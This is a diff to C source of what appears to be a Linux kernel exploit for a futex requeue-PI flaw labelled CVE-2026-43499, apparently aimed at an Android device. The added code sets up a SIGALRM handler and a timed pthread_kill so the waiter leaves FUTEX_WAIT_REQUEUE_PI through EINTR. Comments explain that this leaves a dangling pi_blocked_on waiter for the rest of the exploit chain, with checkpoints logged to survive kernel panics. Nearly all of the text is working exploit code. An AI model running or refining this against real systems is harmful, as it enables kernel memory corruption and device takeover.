@@ -18,11 +18,46 @@ atomic_int pipe_prepare_request;
 atomic_int pipe_prepare_done;
 int memfd_leak;
 
+/*
+ * CVE-2026-43499 requires the requeue-PI waiter to exit via a SIGNAL (EINTR),
+ * NOT a clean timeout. The clean timeout path (rt_mutex_cleanup_proxy_lock ->
+ * remove_waiter, str xzr,[task,#0x898]) NULLs task->pi_blocked_on, so the
+ * consumer's later sched_setattr walk sees waiter==NULL and returns before the
+ * chain (proven on-device: SCRATCH-DIAG diffs=0). Interrupting the blocked
+ * waiter with SIGALRM and bumping its priority from inside the handler makes the
+ * futex return EINTR while leaving pi_blocked_on set -> a dangling waiter the
+ * pselect reclaim + consumer walk then drive. (Mechanism the oppo base dropped;
+ * HANDOFF §2A documents it as the only reliable dangling-waiter generator.)
+ */
+volatile sig_atomic_t sigalrm_fired;
+volatile int sigalrm_setprio_ret;
+volatile int sigalrm_setprio_errno;
+static void waiter_sigalrm_handler(int sig) {
+  (void)sig;
+  sigalrm_fired = 1;
+  errno = 0;
+  sigalrm_setprio_ret = setpriority(PRIO_PROCESS, 0, 5);
+  sigalrm_setprio_errno = errno;
+}
+
 void *waiter_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
 
   int tid = (int)syscall(SYS_gettid);
   atomic_store(&waiter_tid, tid);
+
+  /* Install the SIGALRM handler with SA_RESTART CLEARED so the requeue-PI futex
+   * returns EINTR (not auto-restart) when the driver signals us mid-block. */
+  struct sigaction sa;
+  memset(&sa, 0, sizeof(sa));
+  sa.sa_handler = waiter_sigalrm_handler;
+  sigemptyset(&sa.sa_mask);
+  sa.sa_flags = 0;
+  sigaction(SIGALRM, &sa, NULL);
+  sigset_t unblock;
+  sigemptyset(&unblock);
+  sigaddset(&unblock, SIGALRM);
+  pthread_sigmask(SIG_UNBLOCK, &unblock, NULL);
 
   if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
     pr_error("waiter lock chain errno=%d\n", errno);
@@ -41,11 +76,16 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   errno = 0;
   long wret = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                        &f_pi_target, 0);
+  int werrno = errno;
+  /* Keep the handler installed (harmless setpriority) rather than restoring
+   * SIG_DFL, so a slightly-late pthread_kill can't terminate the process. */
   /* Durable (fsync'd) checkpoint: survives a kernel-panic reboot, unlike
-   * pr_info. Tells us the waiter actually returned from WAIT_REQUEUE_PI
-   * (ret=0 requeued/acquired, errno=110 clean timeout, errno=4 EINTR). */
-  pr_success("ckpt: waiter WAIT_REQUEUE_PI ret=%ld errno=%d tid=%d\n",
-             wret, errno, atomic_load(&waiter_tid));
+   * pr_info. errno=4 EINTR => SIGALRM interrupted (dangling waiter wanted);
+   * errno=110 clean timeout => pi_blocked_on cleared (no dangling waiter). */
+  pr_success("ckpt: waiter WAIT_REQUEUE_PI ret=%ld errno=%d tid=%d "
+             "sigalrm=%d setprio=%d/%d\n",
+             wret, werrno, atomic_load(&waiter_tid), (int)sigalrm_fired,
+             sigalrm_setprio_ret, sigalrm_setprio_errno);
 
   do_pselect_fake_lock_route();
   atomic_store(&route_done, 1);
@@ -233,6 +273,13 @@ void run_main_route_threads(void) {
   /* The CMP_REQUEUE_PI IS the CVE-2026-43499 trigger. If it Oopses the
    * kernel, this line (fsync'd) is the last durable record. */
   pr_success("ckpt: route CMP_REQUEUE_PI ret=%ld errno=%d\n", rq, errno);
+
+  /* Signal the requeued waiter ~50ms in so it exits WAIT_REQUEUE_PI via EINTR
+   * (handler bumps priority) instead of the clean timeout that NULLs
+   * pi_blocked_on. This is what actually creates the dangling waiter. */
+  usleep(env_int_range("SIGALRM_DELAY_USEC", 50000, 0, 5000000));
+  int pkret = pthread_kill(waiter, SIGALRM);
+  pr_success("ckpt: route pthread_kill(waiter,SIGALRM) ret=%d\n", pkret);
 
   while (!atomic_load(&route_done)) {
     if (atomic_exchange(&pipe_prepare_request, 0)) {
